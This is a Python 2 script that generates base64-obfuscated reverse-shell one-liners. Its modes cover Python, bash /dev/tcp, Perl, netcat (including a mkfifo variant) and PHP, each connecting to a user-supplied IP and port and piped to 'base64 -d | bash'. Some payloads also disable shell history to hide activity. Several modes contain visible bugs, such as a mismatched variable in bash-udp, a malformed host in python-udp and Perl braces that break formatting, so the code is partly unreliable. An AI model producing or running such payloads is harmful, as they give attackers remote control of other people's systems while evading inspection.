import base64, sys
try:
    _mode = str(sys.argv[1])
    _ip = str(sys.argv[2])
    _port = str(sys.argv[3])
except:
    pass

if len(sys.argv) != 4:
    print "Usage: ./b64shell <mode> <ip> <port>"
    print """Modes:
                python-tcp
                python-udp
                python-sctp
                python-icmp #TODO
                bash-tcp
                bash-udp
                perl-tcp
                perl-udp    #TODO
                nc-tr-tcp   #netcat.traditional
                nc-tr-udp
                nc-tcp      #netcat no traditional
                nc-udp
                php"""
    sys.exit(0)
if _mode == "python-tcp":
    python_tcp = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(python_tcp))

if _mode == "python-udp":
    python_udp = """python -c 'import socket, pty, os; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("{0}.{1}", 5151)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close()'""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(python_udp))

if _mode == "python-sctp":
    python_sctp = """python -c 'import socket,pty,os;from sctp import *; s = sctpsocket_tcp(socket.AF_INET); s.connect(({0}, {1})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close()'""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(python_sctp))

if _mode == "python-icmp":
    print "TODO..."

if _mode == "bash-tcp":
    bash_tcp = """bash -i >& /dev/tcp/{0}/{1} 0>&1""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(bash_tcp))

if _mode == "bash-udp":
    bash_tcp = """bash -i >& /dev/udp/{0}/{1} 0>&1""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(bash_udp))

if _mode == "perl-tcp":
    perl_tcp = """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(perl_tcp))

if _mode == "perl-udp":
    print "TODO..."

if _mode == "nc-tr-tcp":
    nc_traditional_tcp = """nc -e /bin/sh {0} {1}""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(nc_traditional_tcp))

if _mode == "nc-tr-udp":
    nc_traditional_udp = """nc -u -e /bin/sh {0} {1}""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(nc_traditional_udp))

if _mode == "nc-tcp":
    nc_tcp = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(nc_tcp))

if _mode == "nc-udp":
    nc_udp = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u {0} {1} >/tmp/f""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(nc_udp))

if _mode == "php":
    php = """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'""".format(_ip, _port)
    print "output:\n\necho {0} | base64 -d | bash".format(base64.b64encode(php))
